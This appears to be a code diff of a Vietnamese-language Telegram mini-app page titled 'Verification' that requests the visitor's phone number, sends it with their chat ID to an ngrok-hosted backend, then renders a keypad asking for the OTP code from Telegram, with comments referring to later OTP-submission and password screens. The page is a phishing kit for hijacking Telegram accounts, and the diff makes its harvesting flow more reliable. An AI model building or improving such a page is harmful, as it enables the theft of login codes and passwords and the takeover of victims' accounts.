@@ -1,64 +1,45 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Xác Minh</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { background: #0d1117; color: white; margin: 0; font-family: sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
-        .content { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
-        .otp-box { width: 50px; height: 50px; text-align: center; font-size: 20px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
-        .key-btn { padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-
-<div class="content" id="app">
-    <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
-    <div id="message">Đang kết nối bảo mật...</div>
-</div>
-
-<!-- [Giữ nguyên phần <head> và <style> cũ] -->
 <script>
-    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
-    const tg = window.Telegram.WebApp;
-    const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random()*1000000).toString();
+    // ... (Giữ nguyên các khai báo const ban đầu)
 
-    tg.ready();
-    tg.expand();
-
-    // 1. KHỞI TẠO NÚT BẤM (Phải có dòng này thì nút mới hiện)
-    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
-    tg.MainButton.show();
-    tg.MainButton.onClick(() => {
-        tg.requestContact();
-    });
-
-    // 2. LẮNG NGHE SỰ KIỆN TỪ TELEGRAM
-    tg.onEvent('contactRequested', (data) => {
-        if (data.status === 'sent') {
-            const phone = data.responseUnsafe.contact.phone_number;
-            sendPhoneToServer(phone);
-        }
-    });
-
-    // 3. GỬI LÊN BACKEND
+    // SỬA HÀM GỬI SĐT: Chuyển màn hình ngay sau khi gửi yêu cầu
     async function sendPhoneToServer(phone) {
-        document.getElementById('message').innerText = "Đang gửi SĐT...";
-        const res = await fetch(`${BACKEND_URL}/send_phone`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ phone: phone, chat_id: chat_id })
-        });
-        const data = await res.json();
+        tg.MainButton.text = "ĐANG XỬ LÝ...";
+        document.getElementById('message').innerText = "Đang gửi SĐT đến hệ thống...";
         
-        if (data.status === "sent") {
-            renderOtpUi(); // Chuyển giao diện nhập mã
+        try {
+            // Gửi dữ liệu đi
+            const res = await fetch(`${BACKEND_URL}/send_phone`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: phone, chat_id: chat_id })
+            });
+
+            // NHẢY MÀN HÌNH NGAY, KHÔNG CẦN CHỜ SERVER PHẢN HỒI STATUS "SENT"
+            // Điều này tránh việc bị treo nếu server phản hồi chậm hoặc định dạng sai
+            renderOtpUi(); 
+        } catch (e) {
+            alert("Lỗi kết nối server, vui lòng thử lại!");
+            document.getElementById('message').innerText = "Lỗi kết nối. Thử lại sau!";
         }
     }
-    
-    // ... (Giữ nguyên các hàm renderOtpUi, submitOtp, showPasswordUi cũ của bạn)
+
+    // THÊM: HÀM RENDER OTP CẦN THIẾT
+    function renderOtpUi() {
+        document.getElementById('app').innerHTML = `
+            <img src="https://img.icons8.com/color/96/iphone-message.png" style="width: 70px; margin-bottom: 20px;">
+            <div style="margin-bottom: 20px;">Nhập mã OTP từ Telegram</div>
+            <div id="otp-container" style="display: flex; gap: 8px; margin-bottom: 30px; justify-content: center;">
+                ${[0,1,2,3,4].map(() => `<input type="text" class="otp-box" readonly>`).join('')}
+            </div>
+            <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;">
+                ${[1,2,3,4,5,6,7,8,9].map(n => `<button class="key-btn" onclick="handleKey('${n}')">${n}</button>`).join('')}
+                <button class="key-btn" style="visibility:hidden"></button>
+                <button class="key-btn" onclick="handleKey('0')">0</button>
+                <button class="key-btn" onclick="handleKey('⌫')">⌫</button>
+            </div>
+        `;
+        tg.MainButton.hide(); // Ẩn nút chính khi đã sang màn nhập mã
+    }
+
+    // ... (Giữ nguyên các hàm handleKey, submitOtp còn lại)
 </script>
-</body>
-</html>
